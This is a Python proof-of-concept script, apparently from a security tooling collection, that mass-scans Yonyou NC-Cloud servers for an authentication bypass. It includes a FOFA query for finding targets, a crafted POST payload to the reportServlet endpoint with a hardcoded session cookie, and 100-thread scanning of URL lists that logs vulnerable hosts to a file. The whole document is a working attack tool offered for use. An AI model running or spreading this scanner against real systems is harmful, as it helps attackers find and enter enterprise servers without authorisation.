#用友文件服务器认证绕过

#app="用友-NC-Cloud" 或者是app="用友-NC-Cloud" && server=="Apache-Coyote/1.1"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
___  _ ____  _      ________  _ ____  _     _      ____ 
\  \///  _ \/ \  /|/  __/\  \///  _ \/ \ /\/ \  /|/   _\
 \  / | / \|| |\ ||| |  _ \  / | / \|| | ||| |\ |||  /  
 / /  | \_/|| | \||| |_// / /  | \_/|| \_/|| | \|||  \_ 
/_/   \____/\_/  \|\____\/_/   \____/\____/\_/  \|\____/                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友文件服务器认证")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/report/reportServlet?action=8'
    url = target + url_payload
    header = {
        'Content-Length': '127',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'JSESSIONID=D207AE96056400942620F09D34B8CDF3',
        'Connection': 'close'
    }
    data =  "year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowReport.jsp%3Fraq%3D%252FJourTemp2.raq&currTab="
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "false" in res.text:
            print(f"f[+]该url存在登录绕过漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在登录绕过漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()